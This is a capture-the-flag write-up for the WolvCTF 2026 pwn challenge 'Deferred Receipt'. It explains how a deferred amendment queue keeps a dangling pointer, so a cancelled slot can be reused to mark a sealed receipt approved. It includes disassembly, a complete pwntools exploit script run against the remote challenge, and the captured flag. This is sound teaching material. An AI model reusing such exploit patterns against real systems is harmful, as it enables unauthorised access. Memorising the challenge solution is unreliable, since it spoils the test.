---
title: Deferred Receipt
challenge_type: Pwn
difficulty: medium
writeup_author: "xabito"
competition: wolvctf-2026
summary: |-
  The dispatch desk accepts amendments to public receipts and exports approved sealed receipts. Work is processed in batches, even when the counter gets busy. Can you get a sealed receipt approved?
connections:
  - url: deferred-receipt.wolvctf-2026.kctf.cloud:1337
attachments:
  - title: dis.tar.gz
    url: /assets/files/wolvctf-2026/deferred-receipt/dis.tar.gz
---

## Recon

The menu supports *public* receipts, which can be cancelled and amended, and
*sealed* receipts, which cannot be amended and are exportable only after
approval. Amendments are queued for later processing.

`dis.tar.gz` contains a single `deferred-receipt`, a static-PIE, stripped binary
with a static glibc embedded. It has Full RELRO, NX, PIE, no canary, and no
separate libc or Global Offset Table (GOT) to attack. This is a state-logic flaw
rather than a memory-corruption target, so we read the binary in radare2 and
reconstructed the state.

The receipts live in a static array, not on the heap. The relevant globals are:

| Address | Meaning |
|---|---|
| `0xd3220` | `uint32 types[8]`: 0 = empty, 1 = public, 2 = sealed |
| `0xd3240` | `struct receipt recs[8]`: 16 bytes each |
| `0xd31e8` | the queued **pointer** |
| `0xd31f0` | the queued **value** (dword) |

Each receipt is 16 bytes: an `id`, an 8-byte signature (`"PUBLIC\0\0"` or
`"SEALED\0\0"`), and an `approved` field at offset `0xc`. The win check in the
export handler compares `approved` against `0x4c414553`, the ASCII string
`"SEAL"`. On a match it calls `fopen("/flag")` and prints the flag.

## Exploitation

The bug is the amendment queue. When we queue an amendment, the program validates
the target at *queue time*, then stores the **address** of that receipt's
`approved` field rather than its index:

```console
$ radare2 -A deferred-receipt
0x00008baf  lea rax, [rax + rcx + 0xc]        ; &recs[idx].approved
0x00008bb4  mov qword [0xd31e8], rax         ; queue stores the raw pointer
0x00008bbf  mov dword [0xd31f0], eax         ; and the value
```

Processing the queue later performs an unchecked write:

```asm
0x00008a39  mov rax, qword [0xd31e8]         ; saved pointer
0x00008a47  mov dword [rax], edx             ; *ptr = saved value
```

Cancelling a public receipt frees its slot and zeroes the record but does not
invalidate the queue. Creation reuses the first free slot, so a sealed receipt
created next occupies the address held by the dangling pointer.

This combines time-of-check-to-time-of-use (TOCTOU) with use-after-free (UAF):
validation happens at queue time, the slot is freed, and the queued write later
targets the replacement receipt.

The sequence takes six menu actions. The amendment value is parsed as a 32-bit
hex dword, so we queue `0x4c414553`, which lands little-endian as the ASCII
`"SEAL"`. We create a public receipt, queue its amendment, cancel it, create a
sealed receipt in the same slot, process the queue, and export that sealed
receipt. The deferred write sets its `approved` field without any heap grooming,
libc leak, or ROP.

## Flag capture

We validated the six-step sequence locally in Docker with a planted fake `/flag`,
then used the same menu sequence against the remote:

```python
from pwn import *

SEAL = b'4C414553'   # 0x4c414553 little-endian == "SEAL"

def choose(n):
    io.sendlineafter(b'Choice: ', str(n).encode())

# 1. create public receipt (slot 0, id 1001)
choose(1)
io.recvuntil(b'Receipt ID: ')
pub_id = int(io.recvline().strip())

# 2. queue amendment -> queued_ptr = &rec[0].approved, value = "SEAL"
choose(2)
io.sendlineafter(b'Public receipt ID: ', str(pub_id).encode())
io.sendlineafter(b'Amendment (hex): ', SEAL)

# 3. cancel the public receipt (frees slot, queue pointer left dangling)
choose(3)
io.sendlineafter(b'Public receipt ID: ', str(pub_id).encode())

# 4. create sealed receipt -> reuses slot 0, new id, approved = 0
choose(4)
io.recvuntil(b'Receipt ID: ')
seal_id = int(io.recvline().strip())

# 5. process queue -> rec[0].approved = 'SEAL'
choose(5)

# 6. export the now-"approved" sealed receipt -> cat /flag
choose(6)
io.sendlineafter(b'Sealed receipt ID: ', str(seal_id).encode())

print(io.recvall(timeout=8).decode(errors='replace'))
```

The remote returned:

```
wctf{deferred_receipt_2b6f4058047e5aeb8e1a75aa}
```
